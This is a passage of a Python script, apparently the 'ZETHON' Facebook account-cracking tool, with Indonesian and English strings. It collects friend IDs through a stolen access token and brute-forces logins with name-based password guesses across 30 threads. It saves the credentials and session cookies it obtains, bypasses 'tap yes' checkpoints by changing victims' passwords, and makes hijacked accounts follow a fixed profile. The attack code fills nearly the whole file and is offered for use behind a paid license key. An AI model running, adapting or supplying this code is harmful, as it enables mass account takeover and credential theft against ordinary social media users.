                    bb = xz.split('/')[1]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                sys.stdout.write('\r  [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        for asu in memek.find_all("a",href=True):
            if "Lihat komentar lainnya…" in asu.text:
                ngomen_post("https://mbasic.facebook.com/"+asu.get("href"), ikeh)
    except:pass
# CRACK ID RANDOM
def _ngocok_(__ppk__):
    try:
        nanya_keun = int(input(f'  [{H}?{H}] TOTAL NUMBER TARGET : '))
    except:nanya_keun=1
    id = "results/.x.json"
    prints(Panel(f"[{H}*{H}] 👹ZETHON👹."))
    for mnh in range(nanya_keun):
        mnh +=1
        try:user = input(f'  [{H}*{H}] INPUT ID USERNAME/ID {H}{mnh}{H} : ');_memek_ = __convert__(user)
        except AttributeError:print(f"  {H}[{H}×{H}] Enter the number of targets");continue
        try:
            data = requests.get(f"https://graph.facebook.com/{_memek_.get('_kontol_')}{wewe}{hsus}{asds}&access_token={__ppk__}")
            xxxx = json.loads(data.text)["friends"]
            for x in xxxx["data"]:
                open(id,'a+').write(f"{x['id']}<=>{x['name']}\n")
        except KeyError:
            print(f'  {H}[{H}×{H}] YOUR ID IS NOT PUBLIC');continue
    return __crack__().plerr(id)
# USERNAME CONVERT TO ID
def __convert__(user):
    if user == "me":
        return {"_kontol_":user}
    else:
        payload = {"fburl": "https://free.facebook.com/{}".format(user), "check": "Lookup"}
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        mmk = requests.post(url_lookup, data=payload).content
        xxx = BeautifulSoup(mmk, "html.parser")
        idt = xxx.find("span", id="code")
        asw = idt.text
        return {"_kontol_":asw}
# CHEKER AKUN CHECKPOINT
def gabut():
    dirs = os.listdir("results")
    prints(Panel("[ hasil crack yang tersimpan di file anda ]"))
    for file in dirs:
        print("  [%s+%s] %s"%(H,H,file))
    jalan(f"  [{H}×{H}] Before entering the file, turn on airplane mode for 8 seconds.");time.sleep(5)
    files = input("\n  [%s?%s] masukan nama file : %s"%(H,H,H))
    try:
        buka_baju = open(f'results/{files}','r').readlines()
    except IOError:
        print('\n  [!] file tidak ada');time.sleep(2);chigozie_worldwide()
    ww=input(f"\n  {H}[{H}?{H}] ubah password ketika tap yes [Y/t]: ")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f"  [{H}•{N}] contoh password : {H}chigozie{N}")
        pwBar=input(f"\n  [{H}+{N}] masukan password baru : ")
        if len(pwBar) <= 5:
             print('\n  %s[%s×%s] kata sandi minimal 6 karakter'%(H,H,H))
        else:
            pwBaru.append(pwBar)
    print('%s  [%s*%s] Total %s%s%s Akun'%(H,H,H,str(len(buka_baju)),H))
    jalan("  %s[%s#%s] --------------------------------------------"%(H,H,H))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split('|')
        jalan(f'  {H}[{H}>{H}] mencoba login ke akun : {H}{kontol.replace(" [×] ", "")}{H}')
        try:
            log_hasil(titid[0].replace(" [×] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    print('   [ %sProses Pengecekan Selesai %s]\n'%(H,H))
    input('  [ %sBACK%s ] '%(H,H));os.remove(f"{buka_baju}");chigozie_worldwide()
# CHEKPOINT DETEDTOR
def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    session.headers.update({
        "Host":"mbasic.facebook.com",
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate br",
        "accept-language":"id-ID,id;q=0.9",
        "referer":"https://mbasic.facebook.com/",
        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
    })
    soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r  %s[%s!%s] Hidupkan mode pesawat 8 detik         '%(H,H,H)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print(f"\r  {H}[{H}×{H}] akun sesi new")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OKE.txt', 'a').write(f" [✓] {user}|{pasw}|{coki}\n")
            print(f"\r   🎉{H} hore akunya tidak checkpoint{N}");jalan(f"\r   {H}*{H}  tunggu sebentar sedang mengecek aplikasi...{H}");time.sleep(0.03)
            cek_apk(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    print(f"\r   🎉{H} hore akunya tap yes{N}");jalan(f"\r   {H}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{H}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "CHIGOZIEWORLDWIDE:v"
                    print(f"\r   🎉{H} hore akunya tap yes{H}");jalan(f"\r   {H}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print('  [%s!%s] opshh akunya terpasang autentikasi dua faktor :('%(H,H))
            else:
                print(f"  {H}[{H}!{H}] Error")
        else:
            print("  %s[%s*%s] Terdapat %s Opsi "%(H,H,H,len(cek)))
        for opt in range(len(cek)):
            print(f"  [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
    else:
        print(f"\r  {H}[{H}!{H}] Kata sandi salah atau sudah diubah")
#UBAH PW
def ubah_pw(session,response,link2,user,mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        print(f"\r {H}[{H}✓{H}] berhasil mengubah password menjadi:\n {H}[{H}✓{H}]{H} {user}|{''.join(mmk)}|{coki}{H}")
        open('results/TAB-YES.txt', 'a').write(f" [✓] {user}|{''.join(mmk)}|{coki}\n")
        cek_apk(session,coki)
# CEK APLIKASI YANG TERKAIT
def cek_apk(session,cookie):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n  {H}[{H}!{H}] opshh tidak ada aplikasi aktif di akun ini.")
    else:
        for i in range(len(game)):
            print("    %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),H))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n  {H}[{H}!{H}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
    else:
        for i in range(len(game)):
            print("    %s%s. %s%s"%(H,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),H))
#CEK KEY
def cek_key():
    hapus_teks()
    try:
        open('/data/data/com.termux/.njir.txt', 'r').read()
        jalan(f"\n[{H}×{H}] opshh askses login di tolak karena anda sebelumnya sudah register");time.sleep(3);register()
    except (KeyError,IOError):
        cok()
#REGISTER
def register():
    hapus_teks()
    jalan(f"\n{H}[{H}×{H}] opshh api key kamu sudah kadaluarsa silahkan upgrade ke premium!")
    upd = input(f"[{H}?{H}] apakah ingin upgrade ke premium [Y/t]: ")
    if upd =="":
        print(f"{H}[{H}×{H}] Y/t memek!");time.sleep(2);register()
    elif upd in["Y","y"]:
        jalan(f"{H}[{H}>{H}] Anda akan di alihkan ke {H}whatsapp{N}...");time.sleep(0.02)
        os.system('xdg-open https://wa.me/+2348069472717?text=RATU+ERROR+BELI+LISENSINYA+DOOONG...........???');register()
    elif upd in["T","t"]:
        jalan(f"{B} >> Good byee:)");exit()
    else:
        print(f"{N}[{M}×{N}] Y/t memek!");time.sleep(2);register()
#LOGIN KEY
def cok():
    hapus_teks()
    print("%s[*] ADMIN TIDAK BERTANGGUNG JAWAB ATAS PENYALAHGUNAAN TOOLS INI"%(H))
    print("[*] UNTUK MENDAPATKAN COOKIES GUNAKAN TOOLS COOKIEDOUGH EKSTENSION YANG ADA DI KIWI BROWSER (%sdownload browser kiwi di play store%s)"%(H,H))
    print("[*] JIKA TIDAK MENGERTI MENGGUNAKAN TOOLS SILAHKAN HUBUNGI ADMIN DENGAN KETIK '%sADMIN%s'"%(H,H))
    print("[*] JIKA INGIN MENGGUNAKAN FREE USER SILAHKAN KETIK %sTRIAL%s UNTUK MENDAPATKAN API KEY GERATIS (%s1 day%s)"%(H,H,H,H))
    print("[*] (ADMIN IS NOT RESPONSIBLE FOR ABUSE OF THIS TOOL)")
    print("[*] SCRIPT TELAH DI UPATE PADA TANGGAL [Selasa 25 March 2022]")
    key = input("\n[*] masukan api key kamu : ")
    if key == '':
        print("\[!] jangan kosong bro");time.sleep(2);cok()
    elif key in['admin','Admin','ADMIN']:
        jalan("\n %s* %sAnda akan di alihkan ke whatsapp..."%(H,H));time.sleep(0.02)
        os.system('xdg-open https://wa.me/+2348069472717?text=RATU+EROR+BELI+LISENSINYA+DOOONG...........???');time.sleep(2);cok()
    elif key in['trial','Trial','TRIAL']:
        jalan("\n %s* %sAnda akan di alihkan ke situs web..."%(H,H));time.sleep(0.02)
        os.system('xdg-open https://wa.me/+2348069472717/');cok()
    try:
        xxx = requests.get(my_web.format(f"{mene}{kexx}{key}", headers={"user-agent":"Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}, timeout=10))
        req = json.loads(xxx.text)
        kadaluarsa = req['expired']
        user = req["nama"]
        open('/data/data/com.termux/.njir.txt', 'w').write(key)
        jalan(f"\n[{H}•{H}] Hallo {H}{user}{H} apikey anda masih berlaku sampai tanggal: {H}{kadaluarsa}{H}, silahkan gunakan dengan bijak.");time.sleep(2)
        exit("[%s!%s] jalankan ulang perintah nya dengan ketik python ZETHON.py"%(H,H))
    except KeyError:
        print("\n%s[%s!%s] api key %s%s%s tidak terdaftar di website"%(H,H,H,H,key,H));time.sleep(2);cok()
    except requests.exceptions.ConnectionError:
        exit(f"{H}[{H}!{H}] failed to connect to the server, please check your connection and play airplane mode 8 seconds.")

def tampilkan_apk():
    prints(Panel("displaying the application then the account will be easily hit by checkpoints due to using excessive module requests. it is not recommended to display the application."))
    ww=input(f"  [{H}?{H}] We Want To Show U More Futures [Y/t]: ")
    if ww in ("Y","y","ya"):
        Apk.append("y")
    else:
        Apk.append("t")
# MULAI CRACK
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self,id):
        self.id = open(id,'r').read().splitlines()
        prints(Panel(f"[{hijau}*[/]] TOTAL IDS : [hijau]{len(self.id)}[/]"))
        ___CHIGOZIEWORLDWIDE___ = input('  [%s?%s] DO YOU WANT TO CLONE MANUALLY? [Y/t]: '%(H,H))
        tampilkan_apk()
        if ___CHIGOZIEWORLDWIDE___ in ('Y', 'y'):
            prints(Panel('[[hijau]![/]] CLONE WITH MANUAL PASSWORD  FOR EXAMPLE 👉 chi123,chigozie12345,dll. EACH WORDS IS AT LIST 6 CHARACTERS OR MORE'))
            while True:
                pwek = input('  [%s?%s] ENTER PASSWORD : '%(H,H))
                prints(Panel(f'[{hijau}*[/]] CLONE WITH PASSWORD -> [ [hijau]{pwek}[/] ]'))
                if pwek == '':
                    print('  %s[%s×%s] jangan kosong bro kata sandi nya'%(H,H,H))
                elif len(pwek)<=5:
                    print('  %s[%s×%s] kata sandi minimal 6 karakter'%(H,H,H))
                else:
                    def __chi__(ysc=None): # ycs => Yayan sayang Cindy:3
                        global prog,des
                        cin = input(f'  [{H}*{H}] METHOD : ')
                        if cin == '':
                            print('  %s[%s×%s] jangan kosong bro'%(H,H,H));__chi__()
                        elif cin == '1':
                            ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with CHIGOZIEWORLDWIDE(max_workers=30) as tret:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            tret.submit(self.__metode__, kimochi, ysc, "free.facebook.com")
                                        except:pass
                            hapus_dump()
                            CRACKED(ok,cp)
                        elif cin == '2':
                            ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with CHIGOZIEWORLDWIDE(max_workers=30) as tret:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            tret.submit(self.__metode__, kimochi, ysc, "free.facebook.com")
                                        except:pass
                            hapus_dump()
                            CRACKED(ok,cp)
                        elif cin == '3':
                            ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with CHIGOZIEWORLDWIDE(max_workers=30) as tret:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            tret.submit(self.__metode__, kimochi, ysc, "m.facebook.com")
                                        except:pass
                            hapus_dump()
                            hasil(ok,cp)
                        else:
                            print('  %s[%s×%s] input yang bener'%(H,H,H));__chi__()
                    mentod()
                    __chi__(pwek.split(','))
                    break
        elif ___CHIGOZIEWORLDWIDE___ in ('T', 't'):
            mentod()
            self.__pler__()
        else:
            print('  %s[%s×%s] y/t goblok!'%(H,H,H));self.plerr(id)

    def __metode__(self, user, pasw, cebok):
        global ok, cp, loop
        prog.update(des,description=f'{str(loop)}/{len(self.id)} OK👉[bold green]{len(ok)}[/] CP👉[bold red]{len(cp)}[/]')
        prog.advance(des)
        try:
            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                ua = "Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
                header = {"Host":cebok,"upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"ar,en-US;q=0.7,en;q=0.3"}
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
                header1 = {"Host":cebok,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://"+cebok,"content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"ar,en-US;q=0.7,en;q=0.3"}
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "y" in Apk:
                        self.cek_apk(session, user, pw, coki)
                    elif "t" in Apk:
                        tree = Tree("")
                        tree.add(f" ✓ [bold green]{user}|{pw}").add(f"[bold green]{coki}")
                        prints(tree)
                    wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                    ok.append(wrt)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        tree = Tree("")
                        tree.add(f" [bold red]{user}|{pw}|{day} {month} {year}")
                        prints(tree)
                        wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    tree = Tree("")
                    tree.add(f" [bold red]{user}|{pw}")
                    prints(tree)
                    wrt = ' [×] %s|%s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except Exception as e:
            time.sleep(2)

    def cek_apk(self, session, user, pw, coki):
        hit1, hit2 = 0,0
        tree = Tree("")
        tree.add(f" ✓ [green]{user}|{pw}").add(f"[green]{coki}")
        cek = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
        cek2= session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
        if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
            if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
                tree.add("[[bold red]![/]] Tidak ada aplikasi aktif yang terkait")
            else:
                tree.add("[[bold green]+[/]] Aplikasi Aktif:")
                apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
                ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
                for muncul in apkAktif:
                    hit1+=1
                    try:
                        muncul = re.findall('\<a\ href\=\".*?\">(.*?)<\/a\>',str(muncul))[0]
                    except:
                        muncul = muncul
                    if(hit1==1):
                        tree.add("").add(f"[[bold green]{hit1}[/]] {muncul} [bold green]{ditambahkan[hit2]}[/]")
                    else:
                        tree.add("").add(f"[[bold green]{hit1}[/]] {muncul} [bold green]{ditambahkan[hit2]}[/]")
                    hit1+=2
            if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
                tree.add("[[bold red]![/]] Tidak ada aplikasi kadaluarsa yang terkait")
            else:
                tree.add("[[bold red]-[/]] Aplikasi Kadaluarsa:")
                apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
                kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
                for muncul in apkKadaluarsa:
                    hit1+=1
                    try:
                        muncul = re.findall('\<a\ href\=\".*?\">(.*?)<\/a\>',str(muncul))[0]
                    except:
                        muncul = muncul
                    if(hit1==1):
                        tree.add("").add(f"[[bold red]{hit1}[/]] {muncul} [bold red]{kadaluarsa[hit2]}[/]")
                    else:
                        tree.add("").add(f"[[bold red]{hit1}[/]] {muncul} [bold red]{kadaluarsa[hit2]}[/]")
                    hit2+=1
        else:
            tree.add("[[bold red]![/]] cookie invalid")
        return self.xxx(tree)

    def xxx(self, xx):
        prints(xx)
        
#    <- Bot followers ->
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100005395413800",cookies={"cookie":coki}).text,"html.parser")
        get = r.find("a",string="Ikuti").get("href")
        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text

    def __pler__(self):
        global prog,des
        chi = input(f'  [{H}*{H}] METHOD : ')
        if chi == '':
            print('  %s[%s×%s] jangan kosong bro'%(H,H,H));self.__pler__()
        elif chi in ('1', '01'):
            ingfo()
            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
            des = prog.add_task('',total=len(self.id))
            with prog:
                with CHIGOZIEWORLDWIDE(max_workers=30) as tret:
                    for i in self.id:
                        try:
                            uid, name = i.split('<=>')
                            xz = name.split(' ')
                            pwx = [xz[0]+"123", xz[0]+xz[1], name, xz[0]+"12345"]
                            tret.submit(self.__metode__, uid, pwx, "free.facebook.com")
                        except:pass
            hapus_dump()
            CRACKED(ok,cp)
        elif chi in ('2', '02'):
            ingfo()
            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
            des = prog.add_task('',total=len(self.id))
            with prog:
                with CHIGOZIEWORLDWIDE(max_workers=30) as tret:
                    for i in self.id:
                        try:
                            uid, name = i.split('<=>')
                            xz = name.split(' ')
                            pwx = [xz[0]+"123", xz[0]+xz[1], name, xz[0]+"12345"]
                            tret.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                        except:pass
            hapus_dump()
            CRACKED(ok,cp)
        elif chi in ('3', '03'):
            ingfo()
            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
            des = prog.add_task('',total=len(self.id))
            with prog:
                with CHIGOZIEWORLDWIDE(max_workers=30) as tret:
                    for i in self.id:
                        try:
                            uid, name = i.split('<=>')
                            xz = name.split(' ')
                            if len(xz) == 1:
                                pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                            elif len(xz) == 2:
                                pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                            elif len(xz) == 3:
                                pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                            elif len(xz) == 4:
                                pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                            else:
                                pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                            tret.submit(self.__metode__, uid, pwx, "m.facebook.com")
                        except:pass
            hapus_dump()
            CRACKED(ok,cp)
        else:
            print('  %s[%s×%s] input yang bener'%(H,H,H));self.__pler__()

if __name__ == '__main__':
    chigozie_worldwide()
